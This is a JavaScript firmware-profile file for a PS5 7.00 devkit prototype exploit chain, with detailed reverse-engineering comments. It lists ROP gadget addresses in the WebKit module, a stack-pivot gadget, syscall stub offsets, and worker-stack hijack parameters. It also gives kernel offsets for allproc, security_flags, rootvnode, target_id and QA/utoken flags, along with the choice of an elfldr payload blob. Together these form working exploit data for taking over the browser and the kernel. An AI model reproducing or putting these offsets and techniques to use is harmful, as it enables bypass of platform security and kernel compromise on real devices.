// 07.00 devkit -- PROTO build J02762005.
//
// REGENERATED 2026-09-02 from C:\Users\zecoxao\Desktop\proto_out:
//     libSceNKWebkit_J02762005.sprx
//     libkernel_web_J02762005.sprx
//     libSceLibcInternal_J02762005.sprx
//     700_t_manu_kernel.elf            (+ kdata_FFFFFFFF94AD0000.bin, a live dump of
//                                        this console's kernel data, used to CONFIRM
//                                        the kernel offsets at the end of this file)
//
// The previous revision was derived from PS5UPDATE-devkit-7_00_00_44, a DIFFERENT
// 7.00 build, so almost every value read out of a binary was wrong for this console.
// Two independent proofs that the console runs J02762005 and not 7_00_00_44:
//   - The two import-GOT offsets in the old file were marked "MEASURED on the console,
//     +0x4000 off from the relocation table". They are byte-for-byte the r_offset
//     values of THIS build's relocation table. There is no page bias; the +0x4000 was
//     just the difference between the two builds.
//   - The old file's parked-worker chain, also measured on the console, consists of
//     five addresses that are all return addresses in THIS build and land in
//     unrelated functions of the 7_00_00_44 build.
// So every measured value in the old file was already right and every statically
// derived one was wrong. Everything below is re-derived from the binaries above.
//
// libSceNKWebKit / libkernel_web / libSceLibcInternal: RVA; file offset = rva + 0x4000.
// Kernel values: text-relative (kdata_base = text_base + OFFSET_KERNEL_DATA).

// Unchanged, and re-verified on this build: all three are still 8-byte CFI jump-table
// slots and all three still `jmp 0x003B5780`, the callHostFunctionAsConstructor body.
// main.js only takes this branch on fw >= 9.00, so on 7.00 it is dead, but correct.
const OFFSET_wk_host_constructor_candidates = [0x00010AE8, 0x00010590, 0x000114C0];
// vtable[0] of HTMLTextAreaElement, the ICF-folded WebCore Element destructor.
// Re-derived here by reconstructing every vtable from the .data.rel.ro
// R_X86_64_RELATIVE relocations: this value is slot 0 of exactly 201 vtables of 150+
// slots, reproducing the old file's "201 vtables" claim on the new binary. It sits
// below the +0x2E0 text shift between the two builds, so it did not move.
const OFFSET_wk_vtable_first_element     = 0x0003D720;
// Import GOT slots, read straight from this build's DT_JMPREL / DT_RELA: memset is
// the R_X86_64_JUMP_SLOT, __stack_chk_guard the R_X86_64_GLOB_DAT.
const OFFSET_wk_memset_import                  = 0x03E1AEE0;
const OFFSET_wk___stack_chk_guard_import       = 0x03E18910;

// libkernel_web exports, resolved from this build's SCE symbol table by NID
// (sha1(name + 518D64A6...)[:8] read little-endian, then base64). Only
// __stack_chk_guard, pthread_create_name_np and sceKernelGetCurrentCpu kept their
// old addresses; everything else moved.
const OFFSET_lk___stack_chk_guard                 = 0x0006D1D0;
const OFFSET_lk_pthread_create_name_np            = 0x00001CE0;
const OFFSET_lk_pthread_join                      = 0x00032D60;
const OFFSET_lk_pthread_exit                      = 0x00022A80;
// Stage-5 payload loader ABI. These exact scePthread exports are used by the
// original AioShellcode loader together with an explicit 0x80000-byte stack.
const OFFSET_lk_scePthreadCreate                  = 0x0000E320;
const OFFSET_lk_scePthreadJoin                    = 0x00014D00;
const OFFSET_lk_scePthreadAttrInit                = 0x00029AA0;
const OFFSET_lk_scePthreadAttrSetstacksize        = 0x00017A70;
const OFFSET_lk_scePthreadAttrSetdetachstate      = 0x00017180;
const OFFSET_lk_scePthreadAttrDestroy             = 0x00020980;
const OFFSET_lk_sceKernelSendNotificationRequest  = 0x00008CC0;
const OFFSET_lk_sysctlbyname                      = 0x00027780;
const OFFSET_lk_pthread_create                    = 0x00030610;
const OFFSET_lk_getpid                            = 0x00036CC0;
// TAILQ head written by _thr_link()'s TAILQ_INSERT_HEAD (sub_2BC10 in this build,
// which stores to it with a data-offset xref; tle at +0x38, as main.js assumes).
// Same address on every firmware 7.00-13.60.
const OFFSET_lk__thread_list                   = 0x00064218;
/* Saved PC the idle Worker parks on.
 *
 * MUST BE A SCALAR. The previous revision shipped a three-element ARRAY here, which
 * broke prepare() outright: main.js does `libKernelBase.add32(OFFSET_lk_worker_wait_
 * return)` with no array handling, int64.add32 computes `(this.low >>> 0) + val`, an
 * array coerces to a string, `& 0xFFFFFFFF` yields NaN and `>>> 0` yields 0. The
 * fingerprint scan then hunted for libKernelBase itself, found it zero times, and
 * threw "worker wait return fingerprint count 0, expected 1". Every other firmware
 * profile in this directory ships a scalar.
 *
 * The value is the first element of that array, which is the correct one: the return
 * address of the blocking call inside cond_wait_common, at cond_wait_common + 0x171.
 * Here cond_wait_common is 0x38DC0, so 0x38DC0 + 0x171 = 0x38F31 -- the same +0x171
 * that 7.01 uses (its cond_wait_common is 0x38840 and it ships 0x389B1). The live
 * measurement in the old file read the parked stack as, newest frame first:
 *     0x7fb28  lk+0x2d85c   sub_2D830, return of the umtx wait call
 *     0x7fb48  lk+0x39843   sub_39780, _thr_ucond_wait
 *     0x7fb78  lk+0x38f31   sub_38DC0, cond_wait_common   <-- this one
 *     0x7fc38  lk+0x33d1e   pthread_cond_wait (0x33CF0 + 0x2E)
 *     0x7ffc8  lk+0x39ac0   sub_399E0, thread entry
 * All five are return addresses in THIS build. */
const OFFSET_lk_worker_wait_return             = 0x00038F31;
// `cmp dword [rip+X], 1` in pthread_cond_wait (xref at 0x33CFA), RW data. Unchanged.
const OFFSET_lk_cond_wait_selector             = 0x00064014;
const OFFSET_lk_sleep                             = 0x000260A0;
const OFFSET_lk_sceKernelGetCurrentCpu            = 0x000028A0;

// libSceLibcInternal exports. This module's .text is byte-identical between the two
// 7.00 builds, so every one of these is unchanged -- re-resolved by NID all the same.
const OFFSET_lc_memset                            = 0x00014E70;
const OFFSET_lc_malloc                            = 0x00005E80;
const OFFSET_lc_free                              = 0x00005E90;
const OFFSET_lc_memcpy                            = 0x00003CD0;
const OFFSET_lc_strcmp                            = 0x000408D0;
const OFFSET_lc_memcmp                            = 0x00040890;
const OFFSET_lc_vsnprintf                         = 0x0005C620;
const OFFSET_lc_setjmp                            = 0x0005AF10;
const OFFSET_lc_longjmp                           = 0x0005AF60;

// Fallback estimate only; main.js fingerprints the saved worker PC at runtime and
// reads this only when OFFSET_lk_worker_wait_return is undefined. 0x7FB78 is the slot
// the live measurement above found 0x38F31 in.
const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB78;

// --- build-specific gadget properties ---------------------------------------
// This build has no `41 59 c3`. It does have `47 59 c3` at 0x002773C6, which is
// REX.RXB + `pop rcx` = a real `pop r9 ; ret` consuming one stack slot. No zeroing
// stand-in is needed and none is used.
const OFFSET_wk_r9_zero_only             = false;
// There is no `39 01 c3` (`cmp [rcx], eax`) anywhere in this .text. The gadget below
// is `3b 01 c3` = `cmp eax, [rcx] ; ret`, i.e. the operands are swapped. ZF is
// unaffected by the swap, so branch_types.EQUAL (the only type the engine uses) is
// exact; rop.js throws on the ordered types.
const OFFSET_wk_cmp_operands_reversed    = true;
/* NOW FALSE. The previous revision set this because `mov [rdi], rsi` at 0x007527F0
 * crashed on the console. It crashed because 0x007527F0 is that instruction in the
 * 7_00_00_44 build only; in THIS build the bytes there are `f8 2b 75 2b c5 f8 57 c0`,
 * which is not even an instruction boundary. The real `48 89 37 c3` is at 0x00752AD0
 * here -- the whole upper half of .text moved +0x2E0 between the two builds. With the
 * right address there is nothing to work around, so push_write8 / push_copy8 /
 * push_write_ptr8 go back to the direct store. */
const OFFSET_wk_store_via_rax            = false;
/* Run the gadget conformance suite once prepare() succeeds. The text is execute-only,
 * so nothing here can be checked by reading it on the console; with a working chain
 * the gadgets CAN be checked by executing them and comparing results. */
const OFFSET_wk_gadget_selftest          = true;

// --- 7.00 bootstrap ---------------------------------------------------------
const OFFSET_wk_bootstrap                 = "";  // JIT-less: JS-frame (LLInt) pivot is not viable; native worker-stack hijack is the JIT-independent path
// mov rsp, rdi ; ret -- pivot for an `rdi = this` virtual call (fallback; longjmp is
// the primary pivot since its jmp_buf is fully attacker-built: +0x00 rip, +0x10 rsp).
const OFFSET_wk_stack_pivot_mov_rsp_rdi   = 0x0080C859;
// set once the milestone reports which JS/DOM op yielded the virtual call
const OFFSET_wk_vtable_trigger            = "";
// 7.00's JSC is 613.1; 9.00+ is 616.1. JSArrayBufferView gained a `size_t
// m_byteOffset` between them, so the tail differs:
//   613: +0x18 size_t m_length, +0x20 uint32 m_mode              sizeof 0x28
//   616: +0x18 size_t m_length, +0x20 size_t m_byteOffset,
//        +0x28 uint8  m_mode                                     sizeof 0x30
// core.js checks m_mode here instead of the m_byteOffset this version does not have.
const OFFSET_jsc_abv_mode_at_0x20        = true;

// Which elfldr blob stage 5 should stage.
//
// elfldr does NOT key its per-firmware kernel globals off `text_base + text_size`.
// Its switch reads `mov rcx, [rdi+0x20]` -- payload_args.kdata_base_addr, i.e. the
// "kernel_data_base" kexp computes and passes in -- and every fw block then does
// `mov rax, [rbx]` on that. On this console kexp reports
//     kernel_data_base = 0xFFFFFFFF9A7AC000 = kernel text + 0x13DC000,
// which is 0x78C000 ABOVE text+text_size. The proto kernel's whole writable data
// segment is shifted by that same 0x78C000 relative to the shipped 7.00 kernel, so
// elfldr's stock allproc (0x2859D50) and rootvnode (0x30C7510) offsets are already
// correct here and are left alone. Only two constants are wrong:
//     text base subtraction  0xC50000  -> 0x13DC000
//     security_flags         0xAC8064  -> 0x34B064   (RODATA only grew 0xF000, so its
//                                                     offset from that base SHRANK)
// elfldr-ps5-700proto.elf is the stock blob with exactly those two changed, in each of
// the three copies of the block it carries. The stock file is untouched, so every other
// firmware profile keeps using it.
//
// Verified against a live run: with this blob elfldr computes text 0xFFFFFFFF993D0000,
// allproc 0xFFFFFFFF9D005D50, security_flags 0xFFFFFFFF9AAF7064 and rootvnode
// 0xFFFFFFFF9D873510 -- the first three of which the console independently reported.
const OFFSET_PAYLOAD_ELFLDR              = "elfldr-ps5-700proto.elf";

/* Gadgets, byte-verified against libSceNKWebkit_J02762005.sprx. Selection rule is
 * "first match in .text, lowest RVA" -- the same rule that reproduces 24 of the 26
 * gadgets the previous revision shipped when run against the 7_00_00_44 binary it was
 * made from. The two it does not reproduce are `pop r9`, where the canonical encoding
 * does not exist in either build and the REX.RXB form is used, and `pop rdx`, where
 * the old file hand-picked the second match. The executable segment runs
 * 0x0 .. 0x3674002 (54.5 MB), so every address below is inside it; the encoding
 * actually present at each address is in the trailing comment. */
let wk_gadgetmap = {
	"ret": 0x00000042,               // c3
	"pop rdi": 0x00031434,           // 5f c3
	"pop rsi": 0x000B7098,           // 5e c3
	"pop rdx": 0x001478F7,           // 5a c3
	"pop rcx": 0x00032473,           // 59 c3
	"pop rax": 0x000A6CAB,           // 58 c3
	"pop rsp": 0x0006EEE1,           // 5c c3
	"pop r8": 0x004C6011,            // 41 58 c3
	"pop r9": 0x002773C6,            // 47 59 c3
	"mov [rdi], rsi": 0x00752AD0,    // 48 89 37 c3
	"mov [rdi], rax": 0x00079337,    // 48 89 07 c3
	"mov [rdi], eax": 0x00079338,    // 89 07 c3
	"mov rax, [rax]": 0x0012A439,    // 48 8b 00 c3
	"add rax, rcx": 0x00024321,      // 48 01 c8 c3
	"cmp [rcx], eax": 0x035F9329,    // 3b 01 c3
	"inc dword [rax]": 0x000B70B5,   // ff 00 c3
	"seta al": 0x0021A9C2,           // 0f 97 c0 c3
	"setb al": 0x000A2B46,           // 0f 92 c0 c3
	"sete al": 0x0001CF1F,           // 0f 94 c0 c3
	"setg al": 0x015C5B56,           // 0f 9f c0 c3
	"setl al": 0x006821AF,           // 0f 9c c0 c3
	"shl rax, 3": 0x02488643,        // 48 c1 e0 03 c3
	"shl rax, 4": 0x00572966,        // 48 c1 e0 04 c3
	"shr rax, 3": 0x013092A3,        // 48 c1 e8 03 c3
	"shr rax, 4": 0x02D60E34,        // 48 c1 e8 04 c3
	"infloop": 0x000037D1,           // eb fe
};

/* Syscall stubs in libkernel_web. Each value is the RVA of the
 *     48 c7 c0 NN NN 00 00   mov rax, NN
 *     49 89 ca               mov r10, rcx
 *     0f 05                  syscall
 * sequence, which is what rop.js fcall()s directly. Regenerated by scanning this
 * build's .text for that exact pattern and taking the lowest RVA per syscall number.
 * That rule reproduces all 328 entries the previous revision shipped, exactly, when
 * run against the 7_00_00_44 binary it came from. This build exposes 330 numbers
 * (0x255 and 0x2D9 are new).
 */
let syscall_map = {
	0x001: 0x00036F7A,
	0x002: 0x00038960,
	0x003: 0x00036B40,
	0x004: 0x00036AA0,
	0x005: 0x00037140,
	0x006: 0x00037770,
	0x007: 0x00036340,
	0x00A: 0x000384A0,
	0x00C: 0x00037E30,
	0x00F: 0x000377F0,
	0x014: 0x00036CC0,
	0x017: 0x000367A0,
	0x018: 0x00037E10,
	0x019: 0x00037180,
	0x01B: 0x00037220,
	0x01C: 0x00037450,
	0x01D: 0x00037FE0,
	0x01E: 0x000366A0,
	0x01F: 0x000364C0,
	0x020: 0x00038640,
	0x021: 0x00038160,
	0x022: 0x000382E0,
	0x023: 0x00037CB0,
	0x024: 0x00038B90,
	0x025: 0x00037120,
	0x027: 0x00036BC0,
	0x029: 0x000381C0,
	0x02A: 0x00036B10,
	0x02B: 0x00038800,
	0x02C: 0x00038B50,
	0x02F: 0x00036640,
	0x031: 0x00036620,
	0x032: 0x00037F10,
	0x035: 0x00036860,
	0x036: 0x000369E0,
	0x037: 0x00037CF0,
	0x038: 0x00037BF0,
	0x03B: 0x0003740D,
	0x041: 0x00037850,
	0x049: 0x00037040,
	0x04A: 0x00037DF0,
	0x04B: 0x00036F30,
	0x04E: 0x00037100,
	0x04F: 0x000365A0,
	0x050: 0x00036B60,
	0x053: 0x00036580,
	0x056: 0x000363A0,
	0x059: 0x00037C50,
	0x05A: 0x00038060,
	0x05C: 0x00037650,
	0x05D: 0x000371A0,
	0x05F: 0x000365E0,
	0x060: 0x00037530,
	0x061: 0x00036D80,
	0x062: 0x00037E50,
	0x063: 0x000387C0,
	0x064: 0x00036360,
	0x065: 0x000383E0,
	0x066: 0x00038760,
	0x068: 0x00038460,
	0x069: 0x00037690,
	0x06A: 0x00036980,
	0x071: 0x000379B0,
	0x072: 0x00037360,
	0x074: 0x00038B70,
	0x075: 0x00038C50,
	0x076: 0x00036320,
	0x078: 0x000375D0,
	0x079: 0x00037430,
	0x07A: 0x000380C0,
	0x07C: 0x00036FC0,
	0x07D: 0x00037830,
	0x07E: 0x00038740,
	0x07F: 0x00037320,
	0x080: 0x000382C0,
	0x083: 0x000372A0,
	0x085: 0x00038BB0,
	0x086: 0x000389E0,
	0x087: 0x00037D70,
	0x088: 0x00037AF0,
	0x089: 0x00036D20,
	0x08A: 0x00036210,
	0x08C: 0x00038700,
	0x08D: 0x00037810,
	0x093: 0x00037A90,
	0x0A5: 0x00036540,
	0x0B6: 0x00038540,
	0x0B7: 0x00036380,
	0x0BC: 0x000385A0,
	0x0BD: 0x000389A0,
	0x0BE: 0x00037340,
	0x0BF: 0x00036A40,
	0x0C0: 0x00037D30,
	0x0C2: 0x00037280,
	0x0C3: 0x00036E60,
	0x0C4: 0x000384C0,
	0x0CA: 0x000382A0,
	0x0CB: 0x00037910,
	0x0CC: 0x00038340,
	0x0CE: 0x00036DC0,
	0x0D1: 0x000373A0,
	0x0E8: 0x00036440,
	0x0E9: 0x000378D0,
	0x0EA: 0x00038910,
	0x0EB: 0x000384E0,
	0x0EC: 0x00036C20,
	0x0ED: 0x000389C0,
	0x0EE: 0x00037E70,
	0x0EF: 0x00036FE0,
	0x0F0: 0x000383A0,
	0x0F1: 0x00037BD0,
	0x0F2: 0x00036B80,
	0x0F3: 0x00037A30,
	0x0F7: 0x00038440,
	0x0FB: 0x00036F59,
	0x0FD: 0x00038000,
	0x110: 0x000387A0,
	0x121: 0x00037EB0,
	0x122: 0x000373C0,
	0x136: 0x000370C0,
	0x13B: 0x000385C0,
	0x144: 0x00036C40,
	0x145: 0x00038080,
	0x147: 0x00036D40,
	0x148: 0x000379D0,
	0x149: 0x000364E0,
	0x14A: 0x00037380,
	0x14B: 0x000371E0,
	0x14C: 0x00036760,
	0x14D: 0x00036880,
	0x14E: 0x00036AD0,
	0x154: 0x00036270,
	0x155: 0x000362B0,
	0x157: 0x000381E0,
	0x159: 0x00038300,
	0x15A: 0x00037F40,
	0x16A: 0x00038520,
	0x16B: 0x00036720,
	0x17B: 0x000366C0,
	0x188: 0x000367E0,
	0x189: 0x00038C90,
	0x18D: 0x00036CA0,
	0x190: 0x00036840,
	0x191: 0x000375F0,
	0x192: 0x00037ED0,
	0x193: 0x00038C70,
	0x194: 0x000369A0,
	0x195: 0x00038400,
	0x196: 0x000380E0,
	0x197: 0x00036800,
	0x198: 0x000380A0,
	0x1A0: 0x00038580,
	0x1A1: 0x00038220,
	0x1A5: 0x00036EC4,
	0x1A6: 0x00037C30,
	0x1A7: 0x00037D50,
	0x1AD: 0x00036F10,
	0x1AE: 0x000365C0,
	0x1AF: 0x00036940,
	0x1B0: 0x000372E0,
	0x1B1: 0x00036960,
	0x1B9: 0x00037FC0,
	0x1BA: 0x00036290,
	0x1BB: 0x00036BE0,
	0x1BC: 0x00037C90,
	0x1C6: 0x00036310,
	0x1C7: 0x000386C0,
	0x1C8: 0x00038620,
	0x1D0: 0x00037F80,
	0x1D2: 0x000374F0,
	0x1DB: 0x00036C80,
	0x1DC: 0x00037DD0,
	0x1DD: 0x000386A0,
	0x1DE: 0x000381A0,
	0x1DF: 0x00037200,
	0x1E0: 0x00036C60,
	0x1E1: 0x00036230,
	0x1E2: 0x00038C10,
	0x1E3: 0x00038680,
	0x1E6: 0x00036E80,
	0x1E7: 0x00038A80,
	0x1E8: 0x00038240,
	0x1F3: 0x00036600,
	0x203: 0x00037D10,
	0x20A: 0x00037710,
	0x214: 0x000377D0,
	0x215: 0x00037550,
	0x216: 0x00037B50,
	0x217: 0x00036A20,
	0x218: 0x00037870,
	0x21A: 0x000377B0,
	0x21B: 0x00036C00,
	0x21C: 0x00037B70,
	0x21D: 0x00037730,
	0x21E: 0x00037A10,
	0x21F: 0x00038200,
	0x220: 0x00037B90,
	0x221: 0x00038120,
	0x222: 0x00036EF0,
	0x223: 0x000379F0,
	0x224: 0x000372C0,
	0x225: 0x000374D0,
	0x226: 0x00036480,
	0x227: 0x00036400,
	0x228: 0x00038A60,
	0x229: 0x00037AD0,
	0x22A: 0x00038100,
	0x22B: 0x00037D90,
	0x22C: 0x00037630,
	0x22D: 0x000373E0,
	0x22E: 0x000370E0,
	0x22F: 0x00038CF0,
	0x230: 0x00036BA0,
	0x233: 0x00037510,
	0x234: 0x00036560,
	0x235: 0x00037590,
	0x236: 0x000375B0,
	0x237: 0x00038040,
	0x23C: 0x00036E20,
	0x249: 0x00038480,
	0x24A: 0x00037000,
	0x24B: 0x000378B0,
	0x24C: 0x000363E0,
	0x24F: 0x00036A00,
	0x250: 0x00036D00,
	0x251: 0x000387E0,
	0x252: 0x000376B0,
	0x253: 0x00036680,
	0x254: 0x00038560,
	0x255: 0x00037950,
	0x256: 0x000374B0,
	0x257: 0x00038840,
	0x258: 0x00036250,
	0x259: 0x00036DE0,
	0x25A: 0x00037470,
	0x25B: 0x00038320,
	0x25C: 0x000368C0,
	0x25D: 0x00037020,
	0x25E: 0x000367C0,
	0x25F: 0x00037970,
	0x260: 0x00038C30,
	0x262: 0x00038CD0,
	0x263: 0x00036AF0,
	0x264: 0x00038A40,
	0x265: 0x000361F0,
	0x267: 0x00037570,
	0x268: 0x00038660,
	0x269: 0x00037C70,
	0x26A: 0x00037930,
	0x26B: 0x00036700,
	0x26C: 0x00036820,
	0x26E: 0x00036420,
	0x26F: 0x00037890,
	0x270: 0x00038CB0,
	0x271: 0x00038260,
	0x272: 0x00036D60,
	0x273: 0x000363C0,
	0x274: 0x00037A70,
	0x275: 0x00036E00,
	0x276: 0x00037610,
	0x278: 0x00038BF0,
	0x279: 0x000370A0,
	0x27A: 0x00037060,
	0x27B: 0x00037160,
	0x27C: 0x00036DA0,
	0x27D: 0x00037B10,
	0x27E: 0x00036EA0,
	0x27F: 0x00038D10,
	0x280: 0x00037E90,
	0x281: 0x000369C0,
	0x282: 0x00037240,
	0x283: 0x00038020,
	0x286: 0x00038940,
	0x287: 0x00037B30,
	0x288: 0x00036460,
	0x289: 0x000386E0,
	0x28C: 0x00036500,
	0x28D: 0x00036CE0,
	0x28E: 0x00036A80,
	0x28F: 0x00038500,
	0x290: 0x00038140,
	0x291: 0x000371C0,
	0x292: 0x00036920,
	0x293: 0x00036E40,
	0x294: 0x00038BD0,
	0x295: 0x00038380,
	0x296: 0x000368A0,
	0x297: 0x000376F0,
	0x298: 0x00036780,
	0x299: 0x00038280,
	0x29A: 0x000376D0,
	0x29B: 0x00036660,
	0x29C: 0x00037DB0,
	0x29D: 0x00038820,
	0x29E: 0x00038720,
	0x29F: 0x00038180,
	0x2A0: 0x000385E0,
	0x2A1: 0x00038780,
	0x2A2: 0x00038600,
	0x2A3: 0x00037670,
	0x2A4: 0x00037F60,
	0x2A5: 0x00037A50,
	0x2A6: 0x00037490,
	0x2A7: 0x00036A60,
	0x2A8: 0x00037790,
	0x2A9: 0x00037FA0,
	0x2AA: 0x000366E0,
	0x2AB: 0x00038AA0,
	0x2AC: 0x00037260,
	0x2AD: 0x000364A0,
	0x2AE: 0x000362F0,
	0x2AF: 0x00036900,
	0x2B0: 0x00037300,
	0x2B1: 0x00038A20,
	0x2B2: 0x00037CD0,
	0x2B3: 0x00037C10,
	0x2B4: 0x000383C0,
	0x2B5: 0x000378F0,
	0x2B6: 0x00037750,
	0x2C1: 0x00036740,
	0x2C9: 0x00038A00,
	0x2CC: 0x00036FA0,
	0x2CD: 0x00037AB0,
	0x2CE: 0x00037080,
	0x2CF: 0x000362D0,
	0x2D0: 0x00038360,
	0x2D1: 0x00038420,
	0x2D2: 0x00036520,
	0x2D5: 0x00037BB0,
	0x2D9: 0x000368E0,
};

/* Firmware-specific kernel offsets, from 700_t_manu_kernel.elf. Text-relative except
 * for the two invariant syscall-stack frame offsets. kdata_base = text_base +
 * OFFSET_KERNEL_DATA.
 *
 * Derived by porting the hardware-confirmed 8.00 / 9.00 / 12.00 anchors through
 * capstone-masked code signatures: every rip-relative reference to the anchor value
 * becomes a byte pattern with its own displacement and any neighbouring rel32
 * wildcarded, which is then matched in this kernel and the displacement read back.
 * SECURITY_FLAGS got 100 agreeing signature matches across the three anchors, ALLPROC
 * and ROOTVNODE one each from all three. The same procedure reproduces the shipped
 * 7.00 values EXACTLY when pointed at kernel_700.elf and 700_dvk_kernel.elf
 * (0x1718064 / 0x34A9D50 / 0x3D17510) -- which both validates the method and shows
 * that the proto kernel genuinely differs.
 *
 * Then confirmed against kdata_FFFFFFFF94AD0000.bin, a live dump of this console's
 * kernel data (dump base = kernel VA 0xFFFFFFFF80E70000, KASLR slide 0x13C60000,
 * established by replaying 12513 R_X86_64_RELATIVE relocations at delta 0; note the
 * dump is missing one page between 0xFFFFFFFF8185E000 and 0xFFFFFFFF81860000, so
 * everything above that sits 0x1000 earlier in the file than a naive read expects):
 *     security_flags -> 0x23,  target_id -> 0x81   (a real kit id)
 *     allproc        -> 0xFFFFE9953BC42670         (a live struct proc *)
 *     rootvnode      -> 0xFFFFE98E01DD8960         (a live struct vnode *)
 * All three of the old values read as zero at the same addresses.
 *
 * target_id 0x81 also means poops.js's kexpMaybeKeepKitId() will NOP the kexp blob's
 * forced 0x82 and keep this console's own id, which is the intended devkit path.
 */
const OFFSET_KERNEL_STACK_COOKIE                = 0x00000930;
const OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET   = 0x00000808;
// kdata_base = text_base + text_size = 0xFFFFFFFF80210000 + 0xC50000.
const OFFSET_KERNEL_DATA                        = 0x00C50000;
// Ported from the 9.00 anchor only (12.00's site does not survive the port), so this
// is the least corroborated value in the file. Nothing in the engine reads it.
const OFFSET_KERNEL_SYS_SCHED_YIELD_RET         = 0x00462E19;
const OFFSET_KERNEL_ALLPROC                     = 0x03C35D50;
const OFFSET_KERNEL_SECURITY_FLAGS              = 0x01727064;
const OFFSET_KERNEL_TARGETID                    = 0x0172706D;
const OFFSET_KERNEL_QA_FLAGS                    = 0x01727088;
const OFFSET_KERNEL_UTOKEN_FLAGS                = 0x017270F0;
const OFFSET_KERNEL_ROOTVNODE                   = 0x044A3510;
